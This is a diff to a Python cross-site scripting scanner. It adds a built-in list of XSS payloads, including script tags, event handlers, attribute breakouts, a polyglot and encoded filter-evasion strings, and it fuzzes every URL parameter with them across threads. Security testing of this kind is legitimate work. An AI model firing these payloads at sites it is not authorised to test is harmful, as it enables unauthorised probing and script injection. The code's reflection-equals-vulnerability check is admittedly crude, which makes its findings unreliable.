@@ -7,66 +7,89 @@ sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 import utils
 from core.network import requester
-from config import Colors
+from config import Colors, PAYLOAD_THREADS
+
+# Comprehensive XSS Payloads
+COMPREHENSIVE_XSS_PAYLOADS = [
+    # Standard Script Tags
+    "<script>alert('XSS')</script>",
+    "<script>alert(document.cookie)</script>",
+    
+    # Event Handlers (Img, Svg, Body)
+    "<img src=x onerror=alert('XSS')>",
+    "<svg/onload=alert('XSS')>",
+    "<body onload=alert('XSS')>",
+    "<iframe/onload=alert('XSS')>",
+    
+    # Context Breaking / Attribute Injection
+    "'\"><script>alert('XSS')</script>",
+    "\"><img src=x onerror=alert('XSS')>",
+    "\" onmouseover=\"alert('XSS')", 
+    "' onfocus='alert(1)' autofocus",
+    
+    # Javascript Pseudo-Protocol
+    "javascript:alert('XSS')",
+    "<a href='javascript:alert(1)'>ClickMe</a>",
+    
+    # Polyglots
+    "javascript://%250Aalert(1)//",
+    r"/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",
+    
+    # Filter Evasion / Obfuscation
+    "<scr<script>ipt>alert(1)</script>",
+    "<script>eval(atob('YWxlcnQoMSk='))</script>",
+    "<img src=x onerror=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
+    
+    # DOM Based
+    "#<script>alert(1)</script>",
+    "{{7*7}}",
+    "${alert(1)}"
+]
 
 def scan(url):
-    Colors.info("Testing for Cross-Site Scripting (XSS)...")
-    
-    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-    payload_dir = os.path.join(base_dir, "Payloads", "XSS_payload")
-    
-    xss_payloads = utils.load_payloads_from_dir(payload_dir, extensions=[".txt"])
-    
-    if not xss_payloads:
-        Colors.warning("No payloads found. Using default fallback payloads.")
-        xss_payloads = [
-            "<script>alert('XSS')</script>",
-            "'\"><script>alert('XSS')</script>",
-            "<img src=x onerror=alert('XSS')>",
-        ]
-    else:
-        Colors.success(f"Loaded {len(xss_payloads)} XSS payloads.")
-        # Full scan enabled - No limits
-    
-    import random
-    
-    # --- Optimization: Reflection Pre-Check ---
-    # Before sending 16,000 payloads, verify if the input is actually reflected.
-    canary = f"XSS_CHECK_{random.randint(10000, 99999)}"
-    check_url = f"{url}?q={canary}"
-    try:
-        Colors.info(f"Checking reflection on {url}...")
-        check_res = requester.get(check_url, timeout=5)
-        if not check_res or canary not in check_res.text:
-            Colors.info(f"Input not reflected on {url}. Skipping 16k payload scan (Optimization).")
-            return [] # Save time!
-        Colors.success(f"Reflection confirmed on {url}! Starting exhaustive XSS scan...")
-    except:
+    """Comprehensive XSS scanner with context detection."""
+    if not utils.check_endpoint_alive(url):
         return []
 
+    import random
+    import threading
     from concurrent.futures import ThreadPoolExecutor, as_completed
-    from config import MAX_THREADS
-
+    
+    xss_payloads = COMPREHENSIVE_XSS_PAYLOADS.copy()
+    try:
+        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+        payload_dir = os.path.join(base_dir, "Payloads", "XSS_payload")
+        extra_payloads = utils.load_payloads_from_dir(payload_dir, extensions=[".txt"])
+        if extra_payloads:
+            xss_payloads.extend(extra_payloads)  # Unlocked: scan all payloads
+    except:
+        pass
+    
+    xss_payloads = list(set(xss_payloads))
+    
     vulnerabilities = []
     
-    def test_payload(payload):
-        test_url = f"{url}?q={payload}" 
+    def test_target(target_data):
+        test_url = target_data['url']
+        payload = target_data['payload']
+        param = target_data['param']
+        
         try:
-            response = requester.get(test_url)
-
+            response = requester.get(test_url, timeout=5)
             if response and payload in response.text:
-                Colors.vuln(f"Vulnerability Found! (Payload: {payload[:20]}...)")
+                # Basic check: if payload is exactly reflected, it might be XSS.
+                # In a real deep scanner, we'd check for escaping. 
+                # For now, we assume if the complex payloads are returned as-is, it's vulnerable.
                 
                 info = utils.get_vuln_details("Cross-Site Scripting (XSS)")
-                
                 return {
                     "type": "Cross-Site Scripting (XSS)",
                     "payload": payload,
-                    "evidence": f"Reflected Payload found in response: ...{payload}... (Context hidden)",
-                    "location": f"Parameter: q (in URL: {test_url})",
+                    "evidence": f"Payload reflected in response",
+                    "location": f"Parameter: {param} (URL: {test_url})",
                     "endpoint": url,
-                    "parameter": "q",
-                    "confidence": "Medium", # Reflected but not executing in browser verification
+                    "parameter": param,
+                    "confidence": "Medium", # Medium because we don't verify execution
                     "impact": info["impact"],
                     "severity": "Medium",
                     "recommendation": info["recommendation"]
@@ -75,9 +98,17 @@ def scan(url):
             pass
         return None
     
-    Colors.info(f"Scanning with {MAX_THREADS} threads...")
-    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
-        futures = [executor.submit(test_payload, p) for p in xss_payloads]
+    # Generate tasks
+    scan_tasks = []
+    for payload in xss_payloads:
+        fuzzed_targets = utils.generate_fuzzed_urls(url, payload)
+        for target in fuzzed_targets:
+            target['payload'] = payload
+            scan_tasks.append(target)
+
+    # Moderate thread count
+    with ThreadPoolExecutor(max_workers=PAYLOAD_THREADS) as executor:
+        futures = [executor.submit(test_target, t) for t in scan_tasks]
         for future in as_completed(futures):
             res = future.result()
             if res:
